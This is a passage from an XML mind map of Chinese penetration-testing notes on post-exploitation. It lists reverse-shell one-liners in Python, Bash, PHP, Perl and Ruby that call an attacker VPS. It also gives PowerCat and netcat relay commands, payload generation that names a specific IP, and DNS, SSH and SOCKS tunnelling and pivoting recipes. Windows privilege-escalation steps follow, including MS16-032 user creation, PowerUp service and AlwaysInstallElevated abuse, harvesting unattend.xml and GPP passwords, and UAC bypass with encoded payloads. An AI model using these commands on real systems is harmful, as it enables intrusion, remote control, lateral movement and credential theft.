              <node TEXT="python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPS_ip&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;" ID="2c217361ebf3cb13a" STYLE="fork"/>
            </node>
            <node TEXT="Bash" ID="28a17361ed609114a" STYLE="fork">
              <node TEXT="bash -i &gt;&amp; /dev/tcp/VPS_IP/9999 0&gt;&amp;1" ID="3dc17361ed88e916" STYLE="fork"/>
            </node>
            <node TEXT="PHP" ID="25a17361ef349a00c" STYLE="fork">
              <node TEXT="php -r &apos;$sock=fsockopen(&quot;VPS_ip&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;" ID="14217361ef3c8300c" STYLE="fork"/>
            </node>
            <node TEXT="Perl" ID="36e17361ef72410a5" STYLE="fork">
              <node TEXT="perl -e &apos;use Socket;$i=&quot;VPS_ip&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;" ID="24b17361ef831911b" STYLE="fork"/>
            </node>
            <node TEXT="Ruby" ID="3e417361efff89004" STYLE="fork">
              <node TEXT="ruby -rsocket -e&apos;f=TCPSocket.open(&quot;VPS_ip&quot;,9999).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;" ID="3d517361f03df900c" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="内网代理" ID="20f17361f09ce814e" STYLE="fork">
            <node TEXT="VPS上执行：nc -lvvp 3333 二级内网机器：nc -lvvp 4444 -e /bin/sh 边界WEB服务器：nc -v VPS_ip 3333 -c &quot;nc -v 二级内网机器IP 4444&quot;  " ID="1a517361f0e2590f" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="PowerCat[下载地址：https://github.com/besimorhino/powercat.git ]" ID="e517361f5b77902" STYLE="fork">
          <node TEXT="导入：Import-Module .\powercat.ps1" ID="2b317361f5d65817e" STYLE="fork"/>
          <node TEXT="nc正向连接powercat" ID="15817361f7b7500bb" STYLE="fork">
            <node TEXT="目标机器执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -l -p 888 -e cmd.exe -V}&quot;  本地执行：nc 目标机器IP 888" ID="10f17361f7e11014a" STYLE="fork"/>
          </node>
          <node TEXT="nc反向连接powercat" ID="2e917361fe772818" STYLE="fork">
            <node TEXT="VPS执行：nc -lvvp 4444 目标机器执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -c VPS_ip -p 4444 -v -e cmd.exe}&quot;" ID="c117361fe9f990c9" STYLE="fork"/>
          </node>
          <node TEXT="通过PowerCat传输文件" ID="aa1736200da5b0c9" STYLE="fork">
            <node TEXT="目标机器执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -l -p 9999 -of test.txt -v }&quot;  本地执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -c aaa -p 9999 -i c:\test.txt -v }&quot;" ID="1f517362011dde11d" STYLE="fork"/>
          </node>
          <node TEXT="通过PowerCat生成Payload" ID="2f4173620a03110c" STYLE="fork">
            <node TEXT="正向Shell" ID="9f173620a34470dc" STYLE="fork">
              <node TEXT="本地生成Payload：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -l -p 8000 -e cmd.exe -v -g &gt;&gt; shell.ps1}&quot; 上传至目标执行：powershell.exe -c &quot;.\shell.ps1&quot; 本地执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -c 127.0.0.1 -p 8000 -v}&quot;" ID="1d6173620bfbae0aa" STYLE="fork"/>
              <node TEXT="VPS执行：nc -lvvp 4444  本地生成Payload：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -c 118.24.74.232 -p 4444 -e cmd.exe -v -g &gt;&gt; shell.ps1}&quot; 上传至目标执行：powershell.exe -c &quot;.\shell.ps1&quot; " ID="1da173620f5b950a6" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="PowerCat DNS隧道" ID="2d31736216944d134" STYLE="fork">
            <node TEXT="VPS安装dnscat[下载地址：https://github.com/iagox86/dnscat2.git ] " ID="16a1736216dc2f192" STYLE="fork">
              <node TEXT="git clone https://github.com/iagox86/dnscat2.git" ID="2411736219d5a5189" STYLE="fork"/>
              <node TEXT="cd dnscat2/server" ID="3d71736219f2f502b" STYLE="fork"/>
              <node TEXT="yum install -y ruby" ID="1a6173621a0a1f0b5" STYLE="fork"/>
              <node TEXT="gem install bundler" ID="88173621a21ee038" STYLE="fork"/>
              <node TEXT="bundler install" ID="38b173621a32c507d" STYLE="fork"/>
              <node TEXT="ruby dnscat2.rb ttpowercat.test -e open --no-cache" ID="cd173621a3f0e0d7" STYLE="fork"/>
            </node>
            <node TEXT="目标机器执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -c VPS_IP -p 53 -dns ttpowercat.test -e cmd.exe}&quot;" ID="1cf173621af5cd01d" STYLE="fork"/>
          </node>
          <node TEXT="通过PowerCat作为内网代理" ID="348173621c184602a" STYLE="fork">
            <node TEXT="二级内网机器执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -l -p 9999 -e cmd.exe -v}&quot;" ID="3cc173621c4324001" STYLE="fork"/>
            <node TEXT="边界机器执行：powershell.exe -c &quot;&amp; {Import-module .\powercat.ps1;powercat -l -v -p 8000 -r tcp:二级内网机器IP:9999}&quot;" ID="bc173621e7e9d011" STYLE="fork"/>
            <node TEXT="VPS执行：nc 边界机器外网IP 8000 -vv" ID="368173621d5ad50d5" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="应用层隧道技术" ID="27b17362223e6d164" STYLE="fork">
        <node TEXT="SSH协议" ID="12e17362225f7d0cd" STYLE="fork">
          <node TEXT="常见参数说明" ID="2217362227895093" STYLE="fork">
            <node TEXT="-C 压缩传输，提高传输速度" ID="2d41736224507d149" STYLE="fork"/>
            <node TEXT="-f  将SSH传输转入后台执行，不占用当前Shell" ID="36a1736224802c04b" STYLE="fork"/>
            <node TEXT="-N 建立 静默连接" ID="df1736224c29d198" STYLE="fork"/>
            <node TEXT="-g 允许远程主机连接本地用于转发的端口" ID="5a1736224e52c052" STYLE="fork"/>
            <node TEXT="-L 本地端口转发" ID="15217362252552119" STYLE="fork"/>
            <node TEXT="-R 远程端口转发" ID="2331736225433b06b" STYLE="fork"/>
            <node TEXT="-D 动态转发（Socks代理）" ID="3c117362257475177" STYLE="fork"/>
            <node TEXT="-P 指定SSH端口" ID="1861736225b6be10b" STYLE="fork"/>
          </node>
          <node TEXT="本地转发" ID="2351736225e50b025" STYLE="fork">
            <node TEXT="外网边界服务器将内网机器3389端口转发出来" ID="36d1736225f9e512b" STYLE="fork">
              <node TEXT="VPS上执行：ssh -CFNg -L 1153:内网机器IP:3389 root@外网边界服务器IP" ID="2291736227ef350a9" STYLE="fork"/>
              <node TEXT="本地访问VPS:1153端口，即内网机器3389" ID="3e717362292a7b035" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="远程转发" ID="cb17362297e6d063" STYLE="fork">
            <node TEXT="内网边界服务器执行：ssh -CfNg -R 1153:内网机器IP:3389 root@VPS_IP" ID="c517362298d9517c" STYLE="fork"/>
            <node TEXT="本地访问VPS:1153端口，即内网机器3389" ID="5b173622be38e0b7" STYLE="fork"/>
          </node>
          <node TEXT="动态转发" ID="39c173622c384c041" STYLE="fork">
            <node TEXT="在VPS上执行命令：ssh -CfNg -D 7000 root@外网边界服务器" ID="2e173622c4f0d15f" STYLE="fork"/>
            <node TEXT="本地配置Proxifier设置VPS_IP:7000端口Socks5代理" ID="38a173622d230516f" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="HTTP/HTTPS协议" ID="64173623195fd054" STYLE="fork">
          <node TEXT="常见工具：reDuh、reGeorg、meterpreter、tunna等" ID="6a1736231af4c0b1" STYLE="fork"/>
          <node TEXT="reGeorg" ID="bf173623283a301a" STYLE="fork">
            <node TEXT="上传对应版本的webshell" ID="16e1736232f6bc01b" STYLE="fork"/>
            <node TEXT="python reGeorgSocksProxy.py -u webshell地址 -p 9999" ID="a91736232a734195" STYLE="fork"/>
            <node TEXT="本地配置Proxifier设置127.0.0.1:9999端口Socks5代理" ID="b8173623349e4076" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="DNS协议" ID="3c11736233d9430db" STYLE="fork">
          <node TEXT="dnscat2 " ID="1691736233f44508" STYLE="fork">
            <node TEXT="太复杂了，自己百度" ID="11e17362350d5b189" STYLE="fork"/>
          </node>
          <node TEXT="iodine[kali内置]" ID="21317362352b6e03a" STYLE="fork">
            <node TEXT="太复杂了，自己百度" ID="39d17362353adb08" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="Socks代理" ID="bd173623644b4074" STYLE="fork">
        <node TEXT="常用Socks代理工具" ID="3211736236b0e2067" STYLE="fork">
          <node TEXT="EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、proxyChains" ID="c2173623e1b7c168" STYLE="fork"/>
        </node>
        <node TEXT="EarthWorm" ID="1c5173623ed294194" STYLE="fork">
          <node TEXT="正向Socks 5 " ID="3c9173623ee4fa006" STYLE="fork">
            <node TEXT="适用于目标机器拥有外网IP: ew -s ssocksd -l 888" ID="1e4173623f3a2c038" STYLE="fork"/>
          </node>
          <node TEXT="反向Socks 5" ID="2711736240783a081" STYLE="fork">
            <node TEXT="VPS上执行：ew -s rcsocks -l 1008 -e 888  内网机器执行：ew -s rssocks -d VPS_IP -e 888" ID="e117362409341115" STYLE="fork"/>
          </node>
          <node TEXT="二级内网代理" ID="10b173624292920c9" STYLE="fork">
            <node TEXT="边界机器有外网IP" ID="1de1736242c58a133" STYLE="fork">
              <node TEXT="二级内网机器执行：ew -s ssocksd -l 888" ID="1df17362456fe1051" STYLE="fork"/>
              <node TEXT="边界机器执行： ew -s lcx_tran -l 1080 -f 二级内网机器IP -g 888" ID="ac1736245d2a118b" STYLE="fork"/>
              <node TEXT="设置Socks5代理为边界机器外网IP:1080" ID="3db17362472ad912e" STYLE="fork"/>
            </node>
            <node TEXT="边界机器无外网IP" ID="c5173624795eb00b" STYLE="fork">
              <node TEXT="VPS上执行：ew -s lcx_listen -l 1080 -e 888" ID="491736247b139005" STYLE="fork"/>
              <node TEXT="二级内网机器执行：ew -s ssocksd -l 999" ID="10d17362489141171" STYLE="fork"/>
              <node TEXT="边界机器上执行：ew -s lcx_slave -d VPS_IP -e 888 -f 二级内网机器IP -g 999" ID="1781736249312914c" STYLE="fork"/>
            </node>
          </node>
        </node>
      </node>
      <node TEXT="压缩数据" ID="a8173624d97100e" STYLE="fork">
        <node TEXT="RAR" ID="77173624da6c2016" STYLE="fork">
          <node TEXT="常见参数" ID="20173624e24e0143" STYLE="fork">
            <node TEXT="a 添加要压缩的文件" ID="1c5173624e4c68076" STYLE="fork"/>
            <node TEXT="-k 锁定压缩文件" ID="332173624e730a01b" STYLE="fork"/>
            <node TEXT="-s 生成存档文件" ID="1b5173624e9669169" STYLE="fork"/>
            <node TEXT="-p 指定压缩密码" ID="be173624ec2f20df" STYLE="fork"/>
            <node TEXT="-r 递归压缩，包括子目录" ID="321173624edf8814b" STYLE="fork"/>
            <node TEXT="-x 指定要排除的文件" ID="1ec173624f10e003d" STYLE="fork"/>
            <node TEXT="-v 分卷压缩" ID="3ce173624f35a0127" STYLE="fork"/>
            <node TEXT="-ep 从名称中排除路径" ID="13c173624f55d111a" STYLE="fork"/>
            <node TEXT="-m" ID="26c173624f74b0067" STYLE="fork">
              <node TEXT="-m0 存储，添加到压缩文件时不压缩文件" ID="a3173624f8d11044" STYLE="fork"/>
              <node TEXT="-m1 最快" ID="17d173624fda4a017" STYLE="fork"/>
              <node TEXT="-m2 较快" ID="3b817362501a08177" STYLE="fork"/>
              <node TEXT="-m3 标准" ID="3e2173625032ba039" STYLE="fork"/>
              <node TEXT="-m4 较好" ID="25417362504bf1122" STYLE="fork"/>
              <node TEXT="-m5 最好" ID="3701736250669a0cf" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="将e:\web\目录下所有文件打包为1.rar 放到e:\web\目录下" ID="1591736253bc2801c" STYLE="fork">
            <node TEXT="rar.exe a -k -r -s -m3 E:\web\1.rar E:\web" ID="26017362546482185" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="7-Zip" ID="a2173625adfa1103" STYLE="fork">
          <node TEXT="常见参数" ID="77173625af8890df" STYLE="fork">
            <node TEXT="-r 递归压缩" ID="37173625b0db8132" STYLE="fork"/>
            <node TEXT="-o 指定输入目录" ID="102173625b288904e" STYLE="fork"/>
            <node TEXT="-p 指定密码" ID="a7173625b46b90ef" STYLE="fork"/>
            <node TEXT="-v 分卷压缩" ID="1e7173625b628110f" STYLE="fork"/>
            <node TEXT="a 添加压缩文件" ID="262173625b7ba80c" STYLE="fork"/>
          </node>
          <node TEXT="将e:\web\目录下所有文件打包为1.rar 放到e:\web\目录下" ID="5e173625bef0f06" STYLE="fork">
            <node TEXT="7z.exe a -r -p 123456 E:\web\1.7z E:\web\" ID="31b173625bf3a113e" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="上传和下载[这一节，书的内容全是瞎抄CSDN]" ID="30f173625c90e012b" STYLE="fork">
        <node TEXT="利用FTP协议上传" ID="4c173625ca47717b" STYLE="fork"/>
        <node TEXT="利用VBS上传" ID="5d173625cc4a0072" STYLE="fork"/>
        <node TEXT="利用Debug上传" ID="11e173625d0fc8077" STYLE="fork"/>
        <node TEXT="利用NiShang上传" ID="1e81736261345811d" STYLE="fork"/>
        <node TEXT="利用bitsadmin下载" ID="29a1736261511e112" STYLE="fork"/>
      </node>
    </node>
    <node TEXT="四、权限 提升" ID="1781735a6a92ca131" STYLE="bubble" POSITION="right">
      <node TEXT="系统内核溢出漏洞提权" ID="11a17369fcdb1d0f5" STYLE="fork">
        <node TEXT="手动执行命令发现缺失补丁" ID="11817369e768f3077" STYLE="fork">
          <node TEXT="wmic qfe get Caption,Description,HotFixID,InstalledOn" ID="29c17369e7b26d159" STYLE="fork"/>
          <node TEXT="MS16-032" ID="24017369f21b54024" STYLE="fork">
            <node TEXT="导入Invoke-MS16-032.ps1后，Invoke-MS16-032 -Application cmd.exe -Command &quot;/c net user 1 1 /add&quot;" ID="15717369f22fe418a" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="利用Metasploit发现缺失补丁" ID="1cf17369f355c4094" STYLE="fork">
          <node TEXT="use post/windows/gather/enum_patches" ID="1e317369f3874e00a" STYLE="fork"/>
        </node>
        <node TEXT="Windows Exploit Suggester" ID="36e17369f5165b113" STYLE="fork">
          <node TEXT="更新漏洞库：./windows-exploit-suggester.py --update" ID="21617369f535dc176" STYLE="fork"/>
          <node TEXT="查找漏洞：./windows-exploit-suggester.py -d 2020-07-20-mssb.xls -i patches.txt(patches.txt内容为systeminfo命令结果)" ID="14f17369f623640cf" STYLE="fork"/>
        </node>
        <node TEXT="PowerShell中的Sherlock脚本[下载链接：https://github.com/rasta-mouse/Sherlock]" ID="34517369f734e40bf" STYLE="fork">
          <node TEXT="导入：Import-Module c:\Sherlock.ps1" ID="39917369f75f1316b" STYLE="fork"/>
          <node TEXT="查找漏洞：Find-AllVulns" ID="c517369fc0bec078" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="系统配置错误利用" ID="2117369fd155c0d5" STYLE="fork">
        <node TEXT="系统服务权限配置错误" ID="27f17369fd9214041" STYLE="fork">
          <node TEXT="PowerUp下的实战利用[下载链接：https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 ]" ID="27617369fdc234046" STYLE="fork">
            <node TEXT="powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerUp.ps1;Invoke-AllChecks}&quot;" ID="b417369fe3f1c049" STYLE="fork"/>
            <node TEXT="OmniServers服务漏洞(利用Install-ServiceBinary模块通过WriteServiceBinary编写一个C#服务来添加用户。重启系统，该服务将停止运行并自动添加用户)" ID="1b01736a010caa108" STYLE="fork">
              <node TEXT="powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &apos;OmniServers&apos; -UserName shuteer -Password Password123!}&quot;" ID="23e1736a013a030be" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="Metasploit下的实战利用" ID="1b21736a04c97c188" STYLE="fork">
            <node TEXT="把meterpreter shell转为后台执行" ID="3101736a0c2084038" STYLE="fork"/>
            <node TEXT="use exploit/windows/local/service_permissions 设置SESSION为后台的ID，执行run之后，系统将自动反弹一个新的meterpreter,getuid为system" ID="2a01736a04e9a4113" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="注册表键AlwaysInstallElevated" ID="2571736a0da202012" STYLE="fork">
          <node TEXT="Windows允许低权限用户以system权限运行安装文件，如果启用此策略选项，那么任何权限用户都能以 NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件" ID="2731736a0dd6e4073" STYLE="fork"/>
          <node TEXT="AlwaysInstallElevated漏洞产生原因" ID="491736a10a5950b5" STYLE="fork">
            <node TEXT="运行gpedit.msc打开组策略" ID="3891736a12cc5403f" STYLE="fork"/>
            <node TEXT="组策略--计算机配置--管理模板--Windows 组件--Windows Installer--永远以高特权进行安装 ，选择启用" ID="2a1736a110662144" STYLE="fork"/>
            <node TEXT="组策略--用户配置--管理模板--Windows 组件--Windows Installer--永远以高特权进行安装 ，选择启用" ID="32e1736a12b136058" STYLE="fork"/>
          </node>
          <node TEXT="PowerUp下的实战" ID="2d41736a1334740cc" STYLE="fork">
            <node TEXT="powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerUp.ps1;Get-RegAlwaysInstallElevated}&quot;   返回true，即存在该漏洞" ID="2771736a1370030e1" STYLE="fork"/>
            <node TEXT="powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerUp.ps1;WriteUserAddMSI}&quot;  生成添加用户的msi" ID="3381736a14bb4d038" STYLE="fork"/>
            <node TEXT="msiexec /q /i useradd.msi " ID="17b1736a1ad7dc02b" STYLE="fork">
              <node TEXT="/quiet: 在安装过程中禁止向用户发送消息" ID="3b41736a1fc2c41" STYLE="fork"/>
              <node TEXT="/qn: 不使用GUI" ID="1fe1736a1ff17314a" STYLE="fork"/>
              <node TEXT="/i：安装程序" ID="1b01736a2009f502e" STYLE="fork"/>
            </node>
            <node TEXT="也可以用MSFr exploit/windows/local/always_install_elevated模块" ID="2be1736a20644b0c9" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="可信任服务路径漏洞" ID="2271736a21123b0c2" STYLE="fork">
          <node TEXT="Trusted Service Paths 漏洞产生的原因" ID="541736a21379b05c" STYLE="fork">
            <node TEXT="Windows服务通常以system权限运行，所以系统 在解析服务所对应的文件路径中的空格时，也会以系统权限进行" ID="1451736a2258a4073" STYLE="fork"/>
          </node>
          <node TEXT="Metasploit下的实战利用" ID="1ed1736a23327d06e" STYLE="fork">
            <node TEXT="wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\windows\\&quot; | findstr /i /v &quot;&quot;&quot;   查看服务对应的路径包含空格且没有被引号引起来" ID="3221736a235a6b03e" STYLE="fork"/>
            <node TEXT="检测是否有对目标文件夹的写权限 ：icacls &quot;c:\program Files\grogram folder&quot;" ID="c81736a316314163" STYLE="fork">
              <node TEXT="Everyone:(OI)(CI)(F)" ID="2fc1736a3563cc06a" STYLE="fork">
                <node TEXT="(M) 修改" ID="321736a35deec041" STYLE="fork"/>
                <node TEXT="(F) 完全控制 " ID="3401736a35fa6c18f" STYLE="fork"/>
                <node TEXT="(CI) 从属容器将继承访问控制基" ID="1da1736a36120c10b" STYLE="fork"/>
                <node TEXT="(OI)  从属文件将继承访问控制基" ID="2d01736a36563b09d" STYLE="fork"/>
              </node>
            </node>
            <node TEXT="确认存在漏洞后，把要上传的程序重命名并放置在此漏洞且可写的目录，尝试重启服务" ID="1ca1736a36bf7416f" STYLE="fork">
              <node TEXT="sc stop service_name" ID="3641736a374912082" STYLE="fork"/>
              <node TEXT="sc start service_name" ID="3b61736a37642b086" STYLE="fork"/>
            </node>
            <node TEXT="msf trusted_serivce_path模块" ID="1081736a3793e3136" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="自动安装配置文件" ID="e51736a38377a04d" STYLE="fork">
          <node TEXT="常见配置文件列表[常包含帐号密码]" ID="22f1736a3874d208e" STYLE="fork">
            <node TEXT="c:\sysprep.inf" ID="3261736a39b02205d" STYLE="fork"/>
            <node TEXT="C:\sysprep\sysprep.xml" ID="2b21736a3a92951531" STYLE="fork"/>
            <node TEXT="c:\windows\system32\sysprep.xml" ID="32c1736a3aa5c2075" STYLE="fork"/>
            <node TEXT="c:\windows\system32\sysprep\sysprep.xml" ID="221736a3b2d030e1" STYLE="fork"/>
            <node TEXT="c:\Unattended.xml" ID="19a1736a3c64fa078" STYLE="fork"/>
            <node TEXT="C:\Windows\Panther\Unattend.xml" ID="1f01736a3d6aea0f7" STYLE="fork"/>
            <node TEXT="C:\Windows\Panther\Unattended.xml" ID="1041736a3d79ca08f" STYLE="fork"/>
            <node TEXT="C:\Windows\Panther\Unattend\Unattend.xml" ID="1ae1736a3da2da074" STYLE="fork"/>
            <node TEXT="C:\Windows\Panther\Unattend\Unattended.xml" ID="1cf1736a3a929500d2" STYLE="fork"/>
            <node TEXT="c:\windows\system32\sysprep\Unattend.xml" ID="2b1736a3a92951533" STYLE="fork"/>
            <node TEXT="c:\windows\system32\sysprep\Panther\Unattend.xml" ID="1731736a3e0b5a11a" STYLE="fork"/>
          </node>
          <node TEXT="Metasploit脚本：post/windows/gather/enum_unattend" ID="ac1736a3e9ff9031" STYLE="fork"/>
        </node>
        <node TEXT="计划任务" ID="1481736a3f694a002" STYLE="fork">
          <node TEXT="查看计划任务：schtasks /query /fo LIST /v" ID="26f1736a3f7cea04e" STYLE="fork"/>
          <node TEXT="如果对高权限运行的任务计划所在的目录有写权限，就可以使用恶意程序覆盖原来的程序" ID="32c1736a4070eb0e8" STYLE="fork">
            <node TEXT="自动接受许可协议 accesschk.exe /accepteula  " ID="3d51736a40f26311b" STYLE="fork"/>
            <node TEXT="列出所有权限 配置有缺陷的文件夹" ID="1f21736a4399fa157" STYLE="fork">
              <node TEXT="accesschk.exe -qwsu &quot;Users&quot; *" ID="1c21736a416dec18e" STYLE="fork"/>
              <node TEXT="accesschk.exe -qwsu &quot;Authenticated Users&quot; *" ID="8d1736a43188a09" STYLE="fork"/>
              <node TEXT="accesschk.exe -qwsu &quot;Everyone&quot; *" ID="2d81736a43311b0f9" STYLE="fork"/>
            </node>
          </node>
        </node>
        <node TEXT="Empire 内置模块" ID="2111736a441eea004" STYLE="fork">
          <node TEXT="usemodule privesc/powerup/   然后按tab键可查看powerup的模块列表" ID="511736a45c9db024" STYLE="fork"/>
          <node TEXT="usemodule privesc/powerup/allchecks再输入execute可自动执行全部检查" ID="c91736a46d4bd0e8" STYLE="fork">
            <node TEXT="没有被 引号引起来的服务路径" ID="1701736a473dcb068" STYLE="fork"/>
            <node TEXT="ACL配置错误的服务" ID="1261736a47657413d" STYLE="fork"/>
            <node TEXT="服务的可执行文件的权限 设置不当" ID="b21736a4781c300b" STYLE="fork"/>
            <node TEXT="Unattend.xml" ID="e01736a47b10b0b" STYLE="fork"/>
            <node TEXT="注册表键AlwaysInstallElevated" ID="1ab1736a47d0fc0ae" STYLE="fork"/>
            <node TEXT="如果有Autologon凭证，都会留在注册表中" ID="2b81736a4819ab093" STYLE="fork"/>
            <node TEXT="加密的web.config字符串和应用程序池中的密码" ID="941736a485c2407f" STYLE="fork"/>
            <node TEXT="%PATH% .dll 的劫持机会" ID="1841736a48a3440be" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="组策略首选项" ID="b61736a48edc318e" STYLE="fork">
        <node TEXT="常见的组策略首选项" ID="3541736a4928fc0ee" STYLE="fork">
          <node TEXT="映射驱动器" ID="23c1736a4984d90ae" STYLE="fork"/>
          <node TEXT="创建本地用户" ID="1711736a49a3d2112" STYLE="fork"/>
          <node TEXT="数据 源" ID="1f51736a49b532189" STYLE="fork"/>
          <node TEXT="打印机配置" ID="2091736a49c0530b9" STYLE="fork"/>
          <node TEXT="创建/更新服务" ID="2191736a49cda314e" STYLE="fork"/>
          <node TEXT="计划任务" ID="3281736a49e50a02b" STYLE="fork"/>
        </node>
        <node TEXT="获取组策略的凭据" ID="2141736a85d150145" STYLE="fork">
          <node TEXT="管理员在域中新建一个组策略后，操作系统 会自动在SYSVOL共享目录中生成一个XML文件，该文件保持了组策略更新后的密码。" ID="11736a8be312161" STYLE="fork">
            <node TEXT="手动搜索： type \\dc\SYSVOL\domain\Policies\{ABDAFB3B-920B-4A1A-9B47-B0D8721244D4}\Machine\Preferences\Groups\Groups.xml" ID="1c81736a8d0411138" STYLE="fork">
              <node TEXT="解密：  python gpprefdecrypt.py LdN1Ot2OiiJSC/e+nROCMw" ID="1921736a8e5c11096" STYLE="fork"/>
            </node>
            <node TEXT="Powershell获取 " ID="3821736a8eff29056" STYLE="fork">
              <node TEXT="PowerSploit中的Get-GPPPassword.ps1" ID="a71736a8f29a008c" STYLE="fork"/>
            </node>
            <node TEXT="Metasploit查询cpassword" ID="2651736a909ea8139" STYLE="fork">
              <node TEXT="use post/windows/gather/credentials/gpp" ID="2c81736a90c59111d" STYLE="fork"/>
            </node>
            <node TEXT="使用Empire查找cpassword" ID="351736a9113e215d" STYLE="fork">
              <node TEXT="usemodule privesc/gpp" ID="1271736a91557f03e" STYLE="fork"/>
            </node>
            <node TEXT="其它配置文件" ID="3d01736a9203e00a1" STYLE="fork">
              <node TEXT="Services\Services.xml" ID="6a1736a92278809c" STYLE="fork"/>
              <node TEXT="ScheduledTasks\ScheduledTasks.xml" ID="3b71736a92417a0bb" STYLE="fork"/>
              <node TEXT="Printers\Printers.xml" ID="26e1736a9267f0185" STYLE="fork"/>
              <node TEXT="Drives\Drives.xml" ID="1101736a92815a004" STYLE="fork"/>
              <node TEXT="DataSources\DataSources.xml" ID="3971736a92a3a001e" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="" ID="a01736a92c158072" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="绕过UAC提权" ID="3921736a930578078" STYLE="fork">
        <node TEXT="需要UAC授权的操作如下：" ID="31736a9323a0128" STYLE="fork">
          <node TEXT="配置Windows Update" ID="3591736a938c0009e" STYLE="fork"/>
          <node TEXT="增加/删除用户" ID="1051736a93b05815c" STYLE="fork"/>
          <node TEXT="更改帐户类型" ID="1e21736a93c8c9184" STYLE="fork"/>
          <node TEXT="更改UAC设置" ID="2491736a93da49143" STYLE="fork"/>
          <node TEXT="安装 ActiveX" ID="29c1736a93f10a0d7" STYLE="fork"/>
          <node TEXT="安装/卸载程序 " ID="1aa1736a94050018b" STYLE="fork"/>
          <node TEXT="安装 设备驱动程序 " ID="b1736a94266918d" STYLE="fork"/>
          <node TEXT="将文件移动/复制到program files或windows目录下" ID="1161736a9449c103d" STYLE="fork"/>
          <node TEXT="查看其它用户的文件夹" ID="1971736a94ae80177" STYLE="fork"/>
        </node>
        <node TEXT="UAC的四种设置要求" ID="821736a94de90197" STYLE="fork">
          <node TEXT="始终通知：每当有程序 需要使用高级别的权限 时都会提示本地用户" ID="2811736a9513b802d" STYLE="fork"/>
          <node TEXT="仅在程序 试图更改我的计算机时通知我：默认设置。当第三方程序 使用高级别的权限 时会提示本地用户" ID="1b01736a9566670ca" STYLE="fork"/>
          <node TEXT="仅在程序 试图更改我的计算机时通知我（不降低桌面的亮度）：与上相同，但提示时不降低桌面的亮度" ID="2071736a95f94f18a" STYLE="fork"/>
          <node TEXT="从不提示：当用户为系统管理员时，所有程序 都会以最高权限运行" ID="1d01736a96d3e9111" STYLE="fork"/>
        </node>
        <node TEXT="ByPassUAC模块" ID="2361736a9749aa00e" STYLE="fork">
          <node TEXT="后台运行获取的管理员权限meterpreter,use exploit/windows/local/bypassuac模块，再设置刚刚的session id，run即可获取新的meterpreter，执行getsystem,即可获取system权限shell" ID="2691736a9769d80d1" STYLE="fork"/>
        </node>
        <node TEXT="RunAs模块" ID="1c71736a9900e90a6" STYLE="fork">
          <node TEXT="后台运行获取的管理员权限meterpreter，use exploit/windows/local/ask模块，创建一个可执行文件，执行run命令后目标机器会弹一个UAC对话框，点击“是”之后 即可获取新的meterpreter" ID="1f51736a99a4b7173" STYLE="fork">
            <node TEXT="在使用RunAs模块时，需要使用EXE::Custom选项创建一个可执行文件，需要进行免杀处理" ID="3a61736a9be2e10da" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="NiShang中的Invoke-PsUACme模块" ID="2bd1736a9c5f7003a" STYLE="fork">
          <node TEXT="Invoke-PsUACme -Verbose   //使用Sysprep方法执行默认的payload" ID="1bf1736a9c8e690db" STYLE="fork"/>
          <node TEXT="Invoke-PsUACme -method oobe -Verbose //使用oobe方法并执行默认的payload" ID="af1736a9d96b8082" STYLE="fork"/>
          <node TEXT="Invoke-PsUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e Encoded_Payload&quot; //使用-payload参数执行自定义的payload" ID="2ad1736a9de880148" STYLE="fork"/>
        </node>
